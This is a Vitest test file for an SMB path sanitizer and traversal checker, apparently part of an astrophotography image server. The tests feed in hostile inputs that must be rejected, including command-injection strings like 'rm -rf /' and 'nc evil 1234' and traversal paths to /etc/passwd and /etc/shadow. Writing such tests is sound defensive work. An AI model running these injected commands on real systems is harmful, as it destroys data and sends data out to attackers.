import { describe, it, expect } from 'vitest';
import { BASE_PATH, sanitizePath, validatePathNoTraversal } from '../../server/lib/smb';

describe('SMB path validation', () => {
  describe('sanitizePath', () => {
    it('allows normal paths', () => {
      expect(() => sanitizePath('MyWorks/M42/image.jpg')).not.toThrow();
      expect(() => sanitizePath('MyWorks/IC 1318/sub_001.fit')).not.toThrow();
    });

    it('rejects null bytes', () => {
      expect(() => sanitizePath('MyWorks/M42\x00evil')).toThrow('Invalid characters');
    });

    it('rejects backticks', () => {
      expect(() => sanitizePath('MyWorks/`rm -rf /`')).toThrow('Invalid characters');
    });

    it('rejects dollar signs', () => {
      expect(() => sanitizePath('MyWorks/$HOME')).toThrow('Invalid characters');
    });

    it('rejects backslashes', () => {
      expect(() => sanitizePath('MyWorks\\evil')).toThrow('Invalid characters');
    });
  });

  describe('validatePathNoTraversal', () => {
    it('allows normal paths', () => {
      expect(() => validatePathNoTraversal('MyWorks/M42/image.jpg')).not.toThrow();
    });

    it('rejects path traversal', () => {
      expect(() => validatePathNoTraversal('MyWorks/../../../etc/passwd')).toThrow('Path traversal');
    });

    it('rejects sneaky traversal where normalize collapses to a different prefix', () => {
      // path.normalize('MyWorks/M42/../../etc/shadow') -> 'etc/shadow'
      // The hardened check rejects when the normalized first segment differs from the input's.
      expect(() => validatePathNoTraversal('MyWorks/M42/../../etc/shadow')).toThrow('Path traversal');
    });

    it('rejects absolute paths', () => {
      expect(() => validatePathNoTraversal('/etc/passwd')).toThrow('Path traversal');
    });
  });

  describe('sanitizePath additional rejects', () => {
    it('rejects double-quote (closes smbclient cd quote)', () => {
      expect(() => sanitizePath('M42"; del important.fit"')).toThrow('Invalid characters');
    });
    it('rejects semicolon (smbclient command separator)', () => {
      expect(() => sanitizePath('M42; ls')).toThrow('Invalid characters');
    });
    it('rejects newlines', () => {
      expect(() => sanitizePath('M42\nls')).toThrow('Invalid characters');
    });
    it('rejects carriage returns', () => {
      expect(() => sanitizePath('M42\rls')).toThrow('Invalid characters');
    });
    it('rejects ampersand (shell background)', () => {
      expect(() => sanitizePath('M42 & rm -rf /')).toThrow('Invalid characters');
    });
    it('rejects pipe (shell pipeline)', () => {
      expect(() => sanitizePath('M42 | nc evil 1234')).toThrow('Invalid characters');
    });
    it('rejects DEL control character (0x7f)', () => {
      expect(() => sanitizePath('M42\x7fevil')).toThrow('Invalid characters');
    });
  });

  describe('validatePathNoTraversal additional rejects', () => {
    it('rejects Windows-style absolute path', () => {
      expect(() => validatePathNoTraversal('\\Windows\\System32')).toThrow('Path traversal');
    });
    it('rejects bare ".." segment', () => {
      expect(() => validatePathNoTraversal('..')).toThrow('Path traversal');
    });
    it('rejects "../" prefix', () => {
      expect(() => validatePathNoTraversal('../etc/passwd')).toThrow('Path traversal');
    });
    it('rejects mid-path ".." that survives normalize', () => {
      // Some traversals normalize down to a path that still contains '..'
      expect(() => validatePathNoTraversal('a/../../b')).toThrow('Path traversal');
    });
  });
});

describe('BASE_PATH constant', () => {
  it('is set to MyWorks', () => {
    expect(BASE_PATH).toBe('MyWorks');
  });
});
